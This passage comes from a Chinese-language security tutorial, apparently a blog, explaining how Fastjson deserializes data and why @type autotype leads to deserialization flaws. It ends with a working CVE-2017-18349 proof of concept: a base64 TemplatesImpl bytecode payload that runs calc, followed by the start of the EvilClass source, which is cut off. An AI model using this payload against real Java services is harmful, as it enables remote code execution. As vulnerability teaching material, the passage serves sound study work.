class="token punctuation">)</span><span class="token punctuation">;</span>\nperson3<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nperson3<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">&quot;zhaocai_3&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n<span class="token class-name">String</span> s3 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>person3<span class="token punctuation">,</span> <span class="token class-name">SerializerFeature<span class="token punctuation">.</span>WriteClassName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token class-name">Person</span> person3_3 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>s3<span class="token punctuation">,</span><span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person3_3 <span class="token operator">+</span> <span class="token string">&quot;\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+d+'" alt="image" loading="lazy">​</p><p>从上图可知，通过 <code>SerializerFeature.WriteClassName</code>​ 开启自省后序列化成 JSON 的数据就会多一个 <code>@type</code>​ 用来指明反序列化的目标对象类型，<strong>并且调用其</strong> <code>getter/setter/is</code>​ <strong>方法</strong>。</p><hr><p><strong>【fastjson 序列化特性】</strong></p><p>通过调试可以发现在序列化时：</p><ul><li>FastJson 会调用对应成员的 <code>get()</code>​ 方法</li><li>被 private 修饰且没有 get 方法的成员不会被序列化</li><li>被 public 修饰的成员都会被序列化，并且序列化的结果是标准的 JSON 字符串</li></ul><p>​<img src="'+m+'" alt="image" loading="lazy">​</p><p>​<img src="'+v+'" alt="image" loading="lazy">​</p><h3 id="反序列化" tabindex="-1"><a class="header-anchor" href="#反序列化"><span>反序列化</span></a></h3><ul><li><strong>非自省</strong>：<code>public static &lt;T&gt; T parseObject(String text, Class clazz)</code>​，需要在 <code>JSON.parseObject</code>​ 中传入 <code>Class clazz</code>​</li><li>**自省：**​<code>public static &lt;T&gt; T parseObject(String text)</code>​</li></ul><p>序列化时，string 类型会调用全部的 <code>setter</code>​ 方法，public 修饰的成员全赋值，private 则默认赋值失败为 null，但还额外调用了 <code>getProp2_2</code>​。</p><p>​<img src="'+b+'" alt="image" loading="lazy">​</p><p>​<code>private Properties prop2_2; // private 且有 get</code>​，且需要在 json 中对它赋值 getter 才会被额外调用。</p><p>​<img src="'+g+'" alt="image" loading="lazy">​</p><h3 id="feature-supportnonpublicfield" tabindex="-1"><a class="header-anchor" href="#feature-supportnonpublicfield"><span>Feature.SupportNonPublicField</span></a></h3><p>对于没有 set 方法的 private 成员，反序列化时传递 <code>Feature.SupportNonPublicField</code>​ 即可完成赋值。</p><p>可以看到正常情况下 private 属性没有 setter 方法是无法正常完成赋值的，public 的可以。</p><p>​<img src="'+y+'" alt="image" loading="lazy">​</p><p>开启 <code>Feature.SupportNonPublicField</code>​</p><p>​<img src="'+f+'" alt="image" loading="lazy">​</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// Feature.SupportNonPublicField</span>\n<span class="token class-name">String</span> jsonString <span class="token operator">=</span> <span class="token string">&quot;{\\n&quot;</span> <span class="token operator">+</span>\n        <span class="token string">&quot;\\t\\&quot;name\\&quot;:\\&quot;zhaocai_4\\&quot;,\\n&quot;</span> <span class="token operator">+</span>\n        <span class="token string">&quot;\\t\\&quot;age\\&quot;:\\&quot;21\\&quot;,\\n&quot;</span> <span class="token operator">+</span>\n        <span class="token string">&quot;\\t\\&quot;id\\&quot;:\\&quot;888\\&quot;,\\n&quot;</span> <span class="token operator">+</span>\n        <span class="token string">&quot;\\t\\&quot;account\\&quot;:\\&quot;bbb\\&quot;\\n&quot;</span> <span class="token operator">+</span>\n        <span class="token string">&quot;}&quot;</span><span class="token punctuation">;</span>\n\n<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token class-name">Person</span> person_4 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token comment">//Person person_4 = JSON.parseObject(jsonString, Person.class);</span>\n<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person_4 <span class="token operator">+</span> <span class="token string">&quot;\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="parse-和-parseobject-区别" tabindex="-1"><a class="header-anchor" href="#parse-和-parseobject-区别"><span>Parse 和 ParseObject 区别</span></a></h3><p>两者的主要区别就是，<strong>parseObject</strong> 返回的是 <strong>JSONObject</strong> 类型，而 <strong>parse</strong> 返回的是<strong>实际类型的对象</strong>。</p><p>这里是调用 parseObject 返回值的情况，实际 parseObject 调用的也是 parse 方法，只不过在返回之前，将目标对象转换为了 JSONObect 类型。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// parseObject 返回前会将对象转换为 JSONObject 类型</span>\n<span class="token keyword">return</span> obj <span class="token keyword">instanceof</span> <span class="token class-name">JSONObject</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token class-name">JSONObject</span><span class="token punctuation">)</span>obj <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token class-name">JSONObject</span><span class="token punctuation">)</span><span class="token function">toJSON</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>所以进行反序列化时的细节区别在于，<code>parse()</code>​ 会识别并调用目标类的 setter 方法及<strong>某些特定条件的 getter 方法</strong>，而 parseObject() 由于多执行了 <code>JSON.toJSON(obj)</code>​，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。</p><p>也就是说，我们用 <code>parse()</code>​ 反序列化会直接得到特定的类，而无需像 <code>parseObject()</code>​ 一样返回的是 JSONObject 类型的对象、还可能需要去设置第二个参数指定返回特定的类。</p><h2 id="总结一" tabindex="-1"><a class="header-anchor" href="#总结一"><span>总结一</span></a></h2><p>根据几种输出的结果，可以得到每种调用方式的特点：</p><ul><li><p>​<code>parseObject(String text, Class&lt;T&gt;clazz)</code>​​​​​​，构造方法 + setter + 满足条件额外的 getter</p><p><strong>有 Class 类型</strong>：在有 Class 类型时，调用构造方法，所有属性的 setter 方法，properties 属性的 getter 方法；定义类型无论是 Object，User 返回类型都是 User 类型。<strong>反序列化时根据</strong> <code>@type</code>​​​ <strong>制定类型进行解析</strong>，定义了对象的类型</p></li><li><p>​<code>JSONObject parseObject(String text)</code>​​​​​​，构造方法 + setter + getter + 满足条件额外的 getter</p><p><strong>无 Class 类型</strong>：这种情况下调用了<mark>构造方法，所有属性的 getter 方法，非私有属性的 setter 方法，其中 properties 属性的 getter 方法调用了两次</mark>；定义类型无论是 Object，还是 JSONObject 结果都一样，返回的类型都为 JSONObject</p></li><li><p>​<code>parse(String text)</code>​​​​​​，构造方法 + setter + 满足条件额外的 getter</p></li><li><p><strong>公有属性</strong>有无 getter/setter 都可以反序列化成功</p></li><li><p><strong>私有属性</strong>有 getter/setter 反序列化成功，私有属性无 setter 反序列化失败</p></li><li><p><strong>设置</strong> <code>Feature.SupportNonPublicField</code>​​：调用构造方法，所有属性的 setter 方法，properties 属性的 getter 方法；返回类型都为 User 类型，并且不含有 setter 的私有属性也反序列化成功</p></li></ul><h2 id="fastjson-反序列化流程" tabindex="-1"><a class="header-anchor" href="#fastjson-反序列化流程"><span>Fastjson 反序列化流程</span></a></h2><h3 id="反序列化类图" tabindex="-1"><a class="header-anchor" href="#反序列化类图"><span>反序列化类图</span></a></h3><p>Fastjson 反序列化的类方法调用关系如图</p><p>​<img src="'+h+'" alt="image" loading="lazy">​</p><ul><li>JSON：门面类，提供入口</li><li>DefaultJSONParser：主类</li><li>JSONLexerBase：字符分析类</li><li>JavaBeanDeserializer：JavaBean 反序列化类</li><li>JSONLexe：处理 Json 分词，next() 可以获取 Json 字符串的下一个字符</li><li>​ParserConfig​：包含解析配置，反序列化器，标签等各类配置信息</li><li>JSONScanner：负责扫描和获取 json 字符串中的 Token 并返回</li><li>ObjectDeserializer：负责将 json 字符串反序列化，与 JavaBean 有关系，内置各种类型的反序列化器</li></ul><h3 id="反序列化特点" tabindex="-1"><a class="header-anchor" href="#反序列化特点"><span>反序列化特点</span></a></h3><p>​<code>this.getDeserializer()</code>​ 中主要通过比对 type 类型寻找合适的反序列化器，其中有一次 <code>this.denyList</code>​ 黑名单判断，黑名单中的类出现会抛出异常。</p><p>​<code>com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class&lt;?&gt;, java.lang.reflect.Type)</code>​</p><p>​<img src="'+j+'" alt="image" loading="lazy">​</p><p>对 type Class 类型，ClassName 进行一系列比对，由于未能在预设的反序列化器中找到合适的，根据 Class 类型调用 <code>this.createJavaBeanDeserializer</code>​ 创建 <code>JavaBeanDeserializer</code>​</p><p>​<img src="'+A+'" alt="image" loading="lazy">​</p><p>​<img src="'+w+'" alt="image" loading="lazy">​</p><p>​<code>com.alibaba.fastjson.util.JavaBeanInfo#build</code>​</p><p>​<img src="'+S+'" alt="image" loading="lazy">​</p><p>​<img src="'+q+'" alt="image" loading="lazy">​</p><p>得出以下结论，<strong>Fastjson 会对满足下列要求的 setter/getter 方法进行调用：</strong></p><p>【<strong>满足条件的 setter】</strong></p><ul><li>函数名长度大于 4 且以 set 开头</li><li>非静态函数</li><li>返回类型为 void 或当前类</li><li>参数个数为 1 个</li></ul><p>【<strong>满足条件的 getter】</strong></p><ul><li>函数名长度大于等于 4</li><li>以 get 开头且第 4 个字母为大写</li><li>非静态方法</li><li>无参数</li><li>返回值类型继承自 <code>Collection</code>​ 或 <code>Map</code>​ 或 <code>AtomicBoolean</code>​ 或 <code>AtomicInteger</code>​ 或 <code>AtomicLong</code>​</li></ul><p>前面的 <code>properties</code>​ 私有属性，其类型为 Properties，而 Properties 是继承于 Hashtable，Hashtable 是实现 Map 接口类的类，因此 properties 私有属性的 getter 方法时继承自 Map，从而能够成功被 Fastjson 调用。</p><p>注意，除了 getter 方法和 setter 方法外，还有个 is 方法这里没有列举，可自行测试。</p><ul><li>存放 key 的 <code>symbolTable</code>​ 是何时解析的？ 在 SymbolTable 对象生成时，<code>$ref</code>​ 和 <code>@type</code>​ 两个关键字已经被预设进去</li><li>存放 value​ ​的方法是如何获取到值得？ 通过循环获取到目标值得开始和结束索引位置，通过 <code>subString</code>​ 方法截取目标值</li></ul><h3 id="反序列化原理" tabindex="-1"><a class="header-anchor" href="#反序列化原理"><span>反序列化原理</span></a></h3><p>Fastjson 是自己实现的一套序列化和反序列化机制，不是用的 Java 原生的序列化和反序列化机制。无论是哪个版本，Fastjson 反序列化漏洞的原理都是一样的，只不过不同版本是针对不同的黑名单或者利用不同利用链来进行绕过利用而已。</p><p>通过 Fastjson 反序列化漏洞，攻击者可以传入一个恶意构造的 JSON 内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。</p><p><strong>那么如何才能够反序列化出恶意类呢？</strong></p><p>由前面 demo 知道，Fastjson 使用 <code>parseObject()/parse()</code>​ 进行反序列化的时候可以指定类型。==如果指定的类型太大，包含太多子类，就有利用空间了。==例如，如果指定类型为 Object 或 JSONObject，则可以反序列化出来任意类。例如代码写 <code>Object o = JSON.parseObject(poc,Object.class)</code>​ 就可以反序列化出 Object 类或其任意子类，而 Object 又是任意类的父类，所以就可以反序列化出所有类。</p><p><strong>接着，如何才能触发反序列化得到的恶意类中的恶意函数呢？</strong></p><p>由前面知道，在某些情况下进行反序列化时会将反序列化得到的类的构造函数、getter 方法、setter 方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、getter 方法、setter 方法中要存在漏洞才能触发。</p><p>我们到 <code>DefaultJSONParser.parseObject(Map object, Object fieldName)</code>​ 中看下，JSON 中以 <code>@type</code>​ 形式传入的类的时候，调用 <code>deserializer.deserialize()</code>​ 处理该类，并去调用这个类的 setter 和 getter 方法。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name">T</span> value <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token comment">// --&gt;</span>\n<span class="token comment">// com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.lang.reflect.Type, java.lang.Object)</span>\n<span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">&quot;unchecked&quot;</span><span class="token punctuation">)</span>\n    <span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">T</span> <span class="token function">parseObject</span><span class="token punctuation">(</span><span class="token class-name">Type</span> type<span class="token punctuation">,</span> <span class="token class-name">Object</span> fieldName<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        <span class="token keyword">int</span> token <span class="token operator">=</span> lexer<span class="token punctuation">.</span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token keyword">if</span> <span class="token punctuation">(</span>token <span class="token operator">==</span> <span class="token class-name">JSONToken</span><span class="token punctuation">.</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            lexer<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n\n        <span class="token keyword">if</span> <span class="token punctuation">(</span>token <span class="token operator">==</span> <span class="token class-name">JSONToken</span><span class="token punctuation">.</span><span class="token constant">LITERAL_STRING</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> lexer<span class="token punctuation">.</span><span class="token function">bytesValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n                lexer<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n                <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> bytes<span class="token punctuation">;</span>\n            <span class="token punctuation">}</span>\n\n            <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                <span class="token class-name">String</span> strVal <span class="token operator">=</span> lexer<span class="token punctuation">.</span><span class="token function">stringVal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n                lexer<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n                <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> strVal<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token punctuation">}</span>\n        <span class="token punctuation">}</span>\n\n        <span class="token class-name">ObjectDeserializer</span> derializer <span class="token operator">=</span> config<span class="token punctuation">.</span><span class="token function">getDeserializer</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token keyword">try</span> <span class="token punctuation">{</span>\n            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> derializer<span class="token punctuation">.</span><span class="token function">deserialze</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> type<span class="token punctuation">,</span> fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JSONException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">throw</span> e<span class="token punctuation">;</span>\n        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n    <span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>【小结】</strong></p><ul><li>若反序列化指定类型的类如 <code>Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</code>​，该类本身的构造函数、setter 方法、getter 方法存在危险操作，则存在 Fastjson 反序列化漏洞</li><li>若反序列化未指定类型的类如 <code>Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</code>​，该若该类的子类的构造方法、setter 方法、getter 方法存在危险操作，则存在 Fastjson 反序列化漏洞</li></ul><p>‍</p><h2 id="cve-2017-18349-fastjson-1-2-24" tabindex="-1"><a class="header-anchor" href="#cve-2017-18349-fastjson-1-2-24"><span>CVE-2017-18349（fastjson &lt;= 1.2.24）</span></a></h2><p>​<code>fastjson &lt;= 1.2.24</code>​ 反序列化漏洞（CVE-2017-18349），学习 TemplatesImpl 链的相关知识。</p><p>对于 Fastjson 1.2.22-1.2.24 版本的反序列化漏洞的利用，目前已知的主要有以下的利用链：</p><ul><li>基于 TemplateImpl；</li><li>基于 JNDI（又分为基于 Bean Property 类型和 Field 类型）；</li></ul><h3 id="demo" tabindex="-1"><a class="header-anchor" href="#demo"><span>Demo</span></a></h3><ol><li>首先创建一个 maven 项目、导入 Fastjson1.2.23</li></ol><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.23<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="2"><li>demo code</li></ol><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        <span class="token class-name">ParserConfig</span> config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ParserConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">String</span> text <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;@type\\&quot;:\\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\\&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:{ },\\&quot;_outputProperties\\&quot;:{ }}&quot;</span><span class="token punctuation">;</span>\n        <span class="token class-name">Object</span> obj <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> config<span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+x+'" alt="image" loading="lazy">​</p><h3 id="evilclass" tabindex="-1"><a class="header-anchor" href="#evilclass"><span>EvilClass</span></a></h3><p>上面的 <code>_bytecodes</code>​ 的内容是以下内容编译成字节码文件后（<code>.class</code>​）再 <code>base64</code>​ 编码后的结果。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">poc</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token 